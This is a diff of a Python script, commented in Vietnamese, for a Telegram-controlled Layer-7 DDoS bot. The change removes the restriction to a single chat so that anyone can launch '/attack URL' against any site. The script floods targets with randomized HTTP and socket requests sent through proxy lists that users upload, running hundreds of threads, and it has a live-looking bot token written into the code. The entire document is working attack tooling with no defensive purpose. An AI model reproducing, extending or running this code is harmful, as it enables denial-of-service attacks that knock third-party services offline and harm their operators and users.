@@ -7,44 +7,51 @@ import socket
 import ssl
 import json
 import sys
+import re
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
+from urllib.parse import urlparse
 
 # =====================================================
-# DDOS LAYER7 - MỖI LỆNH CHẠY TỐI ĐA 120s
-# TỰ ĐỘNG DỪNG SAU 120s, CÓ THỂ KHỞI ĐỘNG LẠI
+# DDOS LAYER7 - KHÔNG GIỚI HẠN NHÓM, LỆNH Ở ĐÂU CŨNG ĐƯỢC
+# HỖ TRỢ /attack URL - TẤN CÔNG BẤT KỲ TARGET NÀO
 # =====================================================
 
 # -------------------- CẤU HÌNH TELEGRAM --------------------
 TELEGRAM_BOT_TOKEN = "6320148381:AAFvtpr4l8t61IRgynsiUkwKVbCNMw9kdtU"
-TELEGRAM_CHAT_ID = "-1003925717296"
-
-# -------------------- CẤU HÌNH TẤN CÔNG --------------------
-target_url = "http://192.168.1.100:8080"
-target_host = "192.168.1.100"
-target_port = 8080
-proxy_file = "proxies.txt"
-thread_count = 500
-requests_per_second = 200
-use_ssl = False
-MAX_RUN_TIME = 120  # Tối đa 120 giây mỗi lần chạy
+# KHÔNG CẦN CHAT_ID - Bot trả lời mọi nơi, mọi nhóm
 
 # -------------------- BIẾN TOÀN CỤC --------------------
 stop_event = threading.Event()
+is_running = False
+attack_thread = None
+proxy_list = []
+user_agents = []
+proxy_update_time = 0
+
+# Target mặc định, có thể thay đổi qua lệnh /attack URL
+current_target = {
+    'url': 'http://192.168.1.100:8080',
+    'host': '192.168.1.100',
+    'port': 8080,
+    'ssl': False
+}
+
+thread_count = 500
+requests_per_second = 200
+MAX_RUN_TIME = 120
+
 attack_stats = {
     'total_requests': 0,
     'success_count': 0,
     'fail_count': 0,
     'status_codes': {},
     'bytes_sent': 0,
-    'start_time': time.time(),
-    'session_count': 0
+    'start_time': 0,
+    'session_count': 0,
+    'current_target': ''
 }
 stats_lock = threading.Lock()
-proxy_list = []
-user_agents = []
-is_running = False
-command_start_time = 0
 
 # =====================================================
 # LOAD USER-AGENT
@@ -79,7 +86,7 @@ def load_proxies(filepath):
     proxies = []
     if not os.path.exists(filepath):
         return []
-    with open(filepath, 'r') as f:
+    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
         for line in f:
             line = line.strip()
             if line and not line.startswith('#'):
@@ -100,15 +107,83 @@ def load_proxies(filepath):
     return proxies
 
 # =====================================================
-# GỬI TELEGRAM
+# GỬI TELEGRAM - TRẢ LỜI MỌI CHAT ID
 # =====================================================
-def send_telegram(message):
+def send_telegram(message, chat_id=None):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
+        payload = {'text': message, 'parse_mode': 'HTML'}
+        if chat_id:
+            payload['chat_id'] = chat_id
+        # Nếu không có chat_id, gửi về chat_id mặc định (lấy từ lệnh gần nhất)
+        else:
+            # Lấy chat_id từ biến toàn cục hoặc bỏ qua
+            return
         requests.post(url, data=payload, timeout=5)
     except:
         pass
+
+# =====================================================
+# TẢI FILE PROXY TỪ TELEGRAM
+# =====================================================
+def download_telegram_file(file_id, save_path):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
+        params = {'file_id': file_id}
+        r = requests.get(url, params=params, timeout=10)
+        if r.status_code != 200:
+            return False
+        data = r.json()
+        if not data.get('ok'):
+            return False
+        file_path = data['result']['file_path']
+        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
+        r = requests.get(download_url, timeout=30)
+        if r.status_code != 200:
+            return False
+        with open(save_path, 'wb') as f:
+            f.write(r.content)
+        return True
+    except:
+        return False
+
+# =====================================================
+# CẬP NHẬT PROXY
+# =====================================================
+def update_proxies_from_file(file_path, chat_id):
+    global proxy_list, proxy_update_time
+    new_proxies = load_proxies(file_path)
+    if new_proxies:
+        proxy_list = new_proxies
+        proxy_update_time = time.time()
+        send_telegram(f"🔄 Đã cập nhật proxy từ file: {file_path}\n📊 Số proxy: {len(proxy_list)}", chat_id)
+        return True
+    else:
+        send_telegram(f"❌ File {file_path} không có proxy hợp lệ.", chat_id)
+        return False
+
+# =====================================================
+# PARSE URL TỪ LỆNH
+# =====================================================
+def parse_target_url(url_string):
+    if not url_string.startswith(('http://', 'https://')):
+        url_string = 'http://' + url_string
+    
+    parsed = urlparse(url_string)
+    host = parsed.hostname or '127.0.0.1'
+    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+    ssl = parsed.scheme == 'https'
+    
+    # Đảm bảo URL đầy đủ
+    if not parsed.path:
+        url_string = url_string.rstrip('/') + '/'
+    
+    return {
+        'url': url_string,
+        'host': host,
+        'port': port,
+        'ssl': ssl
+    }
 
 # =====================================================
 # TẠO HEADER
@@ -140,9 +215,9 @@ def generate_headers():
     }
 
 # =====================================================
-# TẤN CÔNG HTTP
+# TẤN CÔNG HTTP - SỬ DỤNG TARGET HIỆN TẠI
 # =====================================================
-def attack_http(proxy):
+def attack_http(proxy, target):
     session = requests.Session()
     session.proxies.update(proxy)
     session.timeout = 2
@@ -152,7 +227,7 @@ def attack_http(proxy):
     method = random.choice(methods)
     headers = generate_headers()
     
-    url = target_url
+    url = target['url']
     if method in ['GET', 'HEAD']:
         params = {f'p{random.randint(1,9999)}': 'x'*random.randint(10,1000) for _ in range(random.randint(3,10))}
         url += '?' + '&'.join([f"{k}={v}" for k,v in params.items()])
@@ -188,9 +263,9 @@ def attack_http(proxy):
         return False
 
 # =====================================================
-# TẤN CÔNG SOCKET
+# TẤN CÔNG SOCKET - SỬ DỤNG TARGET HIỆN TẠI
 # =====================================================
-def attack_socket(proxy=None):
+def attack_socket(proxy, target):
     sock = None
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -199,20 +274,20 @@ def attack_socket(proxy=None):
         if proxy:
             proxy_ip, proxy_port = proxy.replace('http://', '').split(':')
             sock.connect((proxy_ip, int(proxy_port)))
-            connect_cmd = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
+            connect_cmd = f"CONNECT {target['host']}:{target['port']} HTTP/1.1\r\nHost: {target['host']}\r\n\r\n"
             sock.send(connect_cmd.encode())
             response = sock.recv(4096)
             if b'200' not in response:
                 sock.close()
                 return False
         else:
-            sock.connect((target_host, target_port))
+            sock.connect((target['host'], target['port']))
         
-        if use_ssl:
+        if target['ssl']:
             context = ssl.create_default_context()
             context.check_hostname = False
             context.verify_mode = ssl.CERT_NONE
-            sock = context.wrap_socket(sock, server_hostname=target_host)
+            sock = context.wrap_socket(sock, server_hostname=target['host'])
         
         path = '/' + 'x'*random.randint(10,500) + f'?id={random.randint(1,999999)}&t={time.time()}'
         headers = generate_headers()
@@ -246,7 +321,7 @@ def attack_socket(proxy=None):
 # =====================================================
 # WORKER
 # =====================================================
-def attack_worker(proxy_pool):
+def attack_worker(proxy_pool, target):
     while not stop_event.is_set():
         try:
             if proxy_pool and random.random() < 0.7:
@@ -257,9 +332,9 @@ def attack_worker(proxy_pool):
             attack_type = random.choice(['http', 'socket', 'http', 'socket', 'http'])
             
             if attack_type == 'http' and proxy:
-                attack_http(proxy)
+                attack_http(proxy, target)
             else:
-                attack_socket(proxy)
+                attack_socket(proxy, target)
             
             time.sleep(1.0 / requests_per_second)
         except:
@@ -270,7 +345,7 @@ def attack_worker(proxy_pool):
 # =====================================================
 def get_stats_text():
     with stats_lock:
-        elapsed = int(time.time() - attack_stats['start_time'])
+        elapsed = int(time.time() - attack_stats['start_time']) if attack_stats['start_time'] > 0 else 0
         total = attack_stats['total_requests']
         success = attack_stats['success_count']
         fail = attack_stats['fail_count']
@@ -279,12 +354,14 @@ def get_stats_text():
         codes = ', '.join([f"{k}:{v}" for k,v in list(attack_stats['status_codes'].items())[:5]])
         
         remaining = max(0, MAX_RUN_TIME - elapsed)
+        status = "🟢 ĐANG TẤN CÔNG" if is_running else "🔴 ĐANG CHỜ LỆNH"
         
-        status = "🟢 ĐANG CHẠY" if is_running else "🔴 ĐÃ DỪNG"
+        target_display = attack_stats.get('current_target', 'Chưa có')
         
         return f"""
-<b>🔥 DDOS LAYER7 - 120s MODE</b>
+<b>🔥 DDOS BOT - KHÔNG GIỚI HẠN</b>
 📌 Trạng thái: {status}
+🎯 Mục tiêu: {target_display}
 ⏱ Đã chạy: {elapsed}s / {MAX_RUN_TIME}s
 ⏳ Còn lại: {remaining}s
 📨 Tổng request: {total:,}
@@ -293,159 +370,241 @@ def get_stats_text():
 📈 Tốc độ: {rate:.1f} req/s
 📊 Mã trạng thái: {codes or 'N/A'}
 💾 Dữ liệu gửi: {bytes_sent:.2f} MB
-🧵 Luồng: {threading.active_count() - 1}
 🌐 Proxy: {len(proxy_list)}
-🎯 Mục tiêu: {target_url}
+🧵 Luồng: {thread_count}
         """
 
 # =====================================================
-# TELEGRAM LISTENER
+# THỰC HIỆN TẤN CÔNG
+# =====================================================
+def run_attack(target, chat_id):
+    global is_running, current_target
+    
+    # Cập nhật target
+    current_target = target
+    with stats_lock:
+        attack_stats['current_target'] = target['url']
+        attack_stats.update({
+            'total_requests': 0,
+            'success_count': 0,
+            'fail_count': 0,
+            'status_codes': {},
+            'bytes_sent': 0,
+            'start_time': time.time(),
+            'session_count': attack_stats.get('session_count', 0) + 1
+        })
+    
+    stop_event.clear()
+    is_running = True
+    
+    send_telegram(f"▶️ BẮT ĐẦU TẤN CÔNG!\n🎯 Target: {target['url']}\n🌐 Proxy: {len(proxy_list)}\n⏱ Tự động dừng sau {MAX_RUN_TIME}s", chat_id)
+    
+    proxy_pool = proxy_list if proxy_list else []
+    
+    with ThreadPoolExecutor(max_workers=thread_count) as executor:
+        futures = [executor.submit(attack_worker, proxy_pool, target) for _ in range(thread_count)]
+        
+        start = time.time()
+        last_report = 0
+        while time.time() - start < MAX_RUN_TIME and not stop_event.is_set():
+            time.sleep(1)
+            elapsed = int(time.time() - start)
+            if elapsed - last_report >= 20:
+                last_report = elapsed
+                with stats_lock:
+                    total = attack_stats['total_requests']
+                    rate = total / max(elapsed, 1)
+                send_telegram(f"⏳ {elapsed}s/{MAX_RUN_TIME}s | Tốc độ: {rate:.1f} req/s | Tổng: {total:,}", chat_id)
+    
+    stop_event.set()
+    is_running = False
+    
+    with stats_lock:
+        total = attack_stats['total_requests']
+        success = attack_stats['success_count']
+        fail = attack_stats['fail_count']
+        elapsed = int(time.time() - attack_stats['start_time'])
+        rate = total / max(elapsed, 1)
+    
+    send_telegram(f"""
+⏹️ ĐÃ DỪNG SAU {min(elapsed, MAX_RUN_TIME)}s
+📊 TỔNG KẾT:
+- Target: {target['url']}
+- Tổng request: {total:,}
+- Thành công: {success:,}
+- Thất bại: {fail:,}
+- Tốc độ TB: {rate:.1f} req/s
+    """, chat_id)
+    send_telegram(get_stats_text(), chat_id)
+
+# =====================================================
+# TELEGRAM LISTENER - KHÔNG GIỚI HẠN NHÓM
 # =====================================================
 def telegram_listener():
-    global is_running, command_start_time, attack_stats
+    global attack_thread, is_running, proxy_list, proxy_file
     last_update_id = 0
+    
+    print("[+] Bot đã sẵn sàng - KHÔNG GIỚI HẠN NHÓM")
+    print("[+] Mọi lệnh /attack URL đều được chấp nhận")
     
     while True:
         try:
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
             params = {'offset': last_update_id + 1, 'timeout': 15}
             r = requests.get(url, params=params, timeout=20)
+            
             if r.status_code == 200:
                 data = r.json()
                 if data.get('ok'):
                     for update in data.get('result', []):
                         last_update_id = update['update_id']
                         msg = update.get('message', {})
-                        if msg.get('chat', {}).get('id') == int(TELEGRAM_CHAT_ID):
-                            text = msg.get('text', '').strip().lower()
-                            
-                            if text == '/attack':
-                                if is_running:
-                                    send_telegram("⚠️ Đang có một đợt tấn công chạy. Dùng /stop để dừng trước.")
+                        chat_id = msg.get('chat', {}).get('id')
+                        
+                        if not chat_id:
+                            continue
+                        
+                        # ===== XỬ LÝ FILE PROXY =====
+                        document = msg.get('document')
+                        if document:
+                            file_name = document.get('file_name', '')
+                            if file_name.endswith('.txt'):
+                                file_id = document['file_id']
+                                send_telegram(f"📥 Đang tải file proxy: {file_name}", chat_id)
+                                
+                                save_path = f"proxy_{int(time.time())}.txt"
+                                if download_telegram_file(file_id, save_path):
+                                    if update_proxies_from_file(save_path, chat_id):
+                                        import shutil
+                                        shutil.copy(save_path, proxy_file)
+                                    threading.Timer(5, lambda: os.remove(save_path) if os.path.exists(save_path) else None).start()
                                 else:
-                                    # Reset stats
-                                    with stats_lock:
-                                        attack_stats = {
-                                            'total_requests': 0,
-                                            'success_count': 0,
-                                            'fail_count': 0,
-                                            'status_codes': {},
-                                            'bytes_sent': 0,
-                                            'start_time': time.time(),
-                                            'session_count': attack_stats.get('session_count', 0) + 1
-                                        }
-                                    stop_event.clear()
-                                    is_running = True
-                                    command_start_time = time.time()
-                                    send_telegram(f"▶️ Bắt đầu tấn công! Tự động dừng sau {MAX_RUN_TIME}s")
-                                    
-                                    # Khởi chạy worker mới
-                                    threading.Thread(target=run_attack, daemon=True).start()
-                            
-                            elif text == '/stop':
+                                    send_telegram("❌ Không thể tải file proxy.", chat_id)
+                        
+                        # ===== XỬ LÝ LỆNH =====
+                        text = msg.get('text', '').strip()
+                        if not text:
+                            continue
+                        
+                        # Lệnh /attack URL - QUAN TRỌNG
+                        if text.lower().startswith('/attack'):
+                            parts = text.split(maxsplit=1)
+                            if len(parts) >= 2:
+                                url_input = parts[1].strip()
+                                # Kiểm tra URL hợp lệ
+                                if url_input.startswith(('http://', 'https://')) or '.' in url_input:
+                                    target = parse_target_url(url_input)
+                                    if is_running:
+                                        send_telegram("⚠️ Đang có đợt tấn công chạy. Dùng /stop trước.", chat_id)
+                                    else:
+                                        if not proxy_list:
+                                            send_telegram("⚠️ Không có proxy! Hãy gửi file proxy .txt trước.", chat_id)
+                                        else:
+                                            send_telegram(f"🎯 Đã nhận target: {target['url']}", chat_id)
+                                            attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
+                                            attack_thread.start()
+                                else:
+                                    send_telegram("❌ URL không hợp lệ. VD: /attack https://example.com", chat_id)
+                            else:
+                                # Không có URL, dùng target mặc định
+                                if is_running:
+                                    send_telegram("⚠️ Đang có đợt tấn công chạy.", chat_id)
+                                else:
+                                    if not proxy_list:
+                                        send_telegram("⚠️ Không có proxy! Hãy gửi file proxy .txt trước.", chat_id)
+                                    else:
+                                        target = current_target
+                                        send_telegram(f"🎯 Dùng target mặc định: {target['url']}", chat_id)
+                                        attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
+                                        attack_thread.start()
+                        
+                        elif text.lower() == '/stop':
+                            if is_running:
                                 stop_event.set()
                                 is_running = False
-                                send_telegram("⛔ Đã dừng tấn công!")
-                            
-                            elif text == '/status':
-                                send_telegram(get_stats_text())
-                            
-                            elif text == '/help':
-                                help_text = """
-<b>🤖 LỆNH ĐIỀU KHIỂN - 120s MODE</b>
-/attack - Bắt đầu tấn công (tự động dừng sau 120s)
-/stop - Dừng tấn công ngay lập tức
-/status - Xem trạng thái hiện tại
-/threads &lt;số&gt; - Đổi số luồng
-/speed &lt;số&gt; - Đổi tốc độ
-/setproxy &lt;file&gt; - Đổi file proxy
-/help - Trợ giúp
-                                """
-                                send_telegram(help_text)
-                            
-                            elif text.startswith('/threads'):
-                                try:
-                                    global thread_count
-                                    thread_count = int(text.split()[1])
-                                    send_telegram(f"✅ Đã cập nhật luồng: {thread_count}")
-                                except:
-                                    send_telegram("❌ Sai định dạng. Dùng: /threads <số>")
-                            
-                            elif text.startswith('/speed'):
-                                try:
-                                    global requests_per_second
-                                    requests_per_second = int(text.split()[1])
-                                    send_telegram(f"✅ Đã cập nhật tốc độ: {requests_per_second} req/s")
-                                except:
-                                    send_telegram("❌ Sai định dạng. Dùng: /speed <số>")
-                            
-                            elif text.startswith('/setproxy'):
-                                try:
-                                    global proxy_file, proxy_list
-                                    new_file = text.split()[1]
-                                    if os.path.exists(new_file):
-                                        proxy_file = new_file
-                                        proxy_list = load_proxies(proxy_file)
-                                        send_telegram(f"✅ Đã đổi file proxy: {new_file} ({len(proxy_list)} proxy)")
-                                    else:
-                                        send_telegram(f"❌ Không tìm thấy file: {new_file}")
-                                except:
-                                    send_telegram("❌ Sai định dạng. Dùng: /setproxy <tên_file>")
-            time.sleep(2)
-        except:
-            time.sleep(5)
+                                send_telegram("⛔ Đã dừng tấn công ngay lập tức!", chat_id)
+                            else:
+                                send_telegram("ℹ️ Không có đợt tấn công nào đang chạy.", chat_id)
+                        
+                        elif text.lower() == '/status':
+                            send_telegram(get_stats_text(), chat_id)
+                        
+                        elif text.lower() == '/proxy':
+                            send_telegram(f"🌐 Số proxy hiện có: {len(proxy_list)}\n📄 File nguồn: {proxy_file}", chat_id)
+                        
+                        elif text.lower() == '/help':
+                            help_text = """
+<b>🤖 DDOS BOT - KHÔNG GIỚI HẠN</b>
 
-# =====================================================
-# CHẠY TẤN CÔNG VÀ TỰ ĐỘNG DỪNG SAU 120s
-# =====================================================
-def run_attack():
-    global is_running
-    proxy_pool = proxy_list
-    
-    # Khởi chạy worker
-    with ThreadPoolExecutor(max_workers=thread_count) as executor:
-        futures = [executor.submit(attack_worker, proxy_pool) for _ in range(thread_count)]
-        
-        # Đợi 120s hoặc cho đến khi có lệnh dừng
-        start = time.time()
-        while time.time() - start < MAX_RUN_TIME and not stop_event.is_set():
-            time.sleep(1)
-            # Gửi cập nhật mỗi 30s
-            elapsed = int(time.time() - start)
-            if elapsed % 30 == 0 and elapsed > 0:
-                send_telegram(f"⏳ Đã chạy {elapsed}s / {MAX_RUN_TIME}s - Tốc độ: {attack_stats['total_requests']/max(elapsed,1):.1f} req/s")
-    
-    # Dừng tất cả worker
-    stop_event.set()
-    is_running = False
-    send_telegram(f"⏹️ Đã dừng sau {MAX_RUN_TIME}s. Tổng request: {attack_stats['total_requests']:,}")
-    send_telegram(get_stats_text())
+📌 <b>LỆNH Ở MỌI NHÓM, MỌI CHAT</b>
+
+📤 <b>GỬI FILE PROXY:</b>
+Gửi file .txt chứa proxy (mỗi dòng 1 proxy)
+Bot tự động nhận và cập nhật.
+
+📋 <b>LỆNH:</b>
+<code>/attack URL</code> - Tấn công target (VD: /attack https://example.com)
+<code>/attack</code> - Tấn công target mặc định
+<code>/stop</code> - Dừng ngay lập tức
+<code>/status</code> - Xem trạng thái
+<code>/proxy</code> - Xem số proxy
+<code>/threads &lt;số&gt;</code> - Đổi số luồng
+<code>/speed &lt;số&gt;</code> - Đổi tốc độ
+<code>/help</code> - Trợ giúp
+
+⏱ Mỗi đợt chạy tối đa 120s
+                            """
+                            send_telegram(help_text, chat_id)
+                        
+                        elif text.lower().startswith('/threads'):
+                            try:
+                                global thread_count
+                                new_count = int(text.split()[1])
+                                if new_count > 0:
+                                    thread_count = new_count
+                                    send_telegram(f"✅ Đã cập nhật số luồng: {thread_count}", chat_id)
+                                else:
+                                    send_telegram("❌ Số luồng phải > 0", chat_id)
+                            except:
+                                send_telegram("❌ Dùng: /threads <số>", chat_id)
+                        
+                        elif text.lower().startswith('/speed'):
+                            try:
+                                global requests_per_second
+                                new_speed = int(text.split()[1])
+                                if new_speed > 0:
+                                    requests_per_second = new_speed
+                                    send_telegram(f"✅ Đã cập nhật tốc độ: {requests_per_second} req/s", chat_id)
+                                else:
+                                    send_telegram("❌ Tốc độ phải > 0", chat_id)
+                            except:
+                                send_telegram("❌ Dùng: /speed <số>", chat_id)
+            
+            time.sleep(2)
+        except Exception as e:
+            time.sleep(5)
 
 # =====================================================
 # KHỞI CHẠY CHÍNH
 # =====================================================
 if __name__ == "__main__":
-    # Tải proxy
-    proxy_list = load_proxies(proxy_file)
+    proxy_file = "proxies.txt"
+    if os.path.exists(proxy_file):
+        proxy_list = load_proxies(proxy_file)
+        proxy_update_time = time.time()
+        print(f"[+] Đã tải {len(proxy_list)} proxy từ file")
+    else:
+        print("[+] Chưa có file proxy. Gửi file .txt qua Telegram để tạo.")
     
-    send_telegram(f"""
-🚀 <b>DDOS LAYER7 - 120s MODE</b>
-🎯 Mục tiêu: {target_url}
-🧵 Số luồng: {thread_count}
-🌐 Proxy: {len(proxy_list)}
-📊 Tốc độ: {requests_per_second} req/s/luồng
-⏱ Thời gian tối đa: {MAX_RUN_TIME}s
-
-🤖 Gửi /help để xem lệnh
-    """)
+    print(f"[+] Bot sẵn sàng - Lệnh /attack URL ở MỌI NHÓM")
+    print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
     
-    # Khởi chạy listener
     threading.Thread(target=telegram_listener, daemon=True).start()
     
-    # Giữ chương trình chạy
     try:
         while True:
-            time.sleep(10)
+            time.sleep(60)
     except KeyboardInterrupt:
         stop_event.set()
-        send_telegram("⛔ Người dùng dừng chương trình.")
+        is_running = False
+        print("[+] Bot đã dừng.")
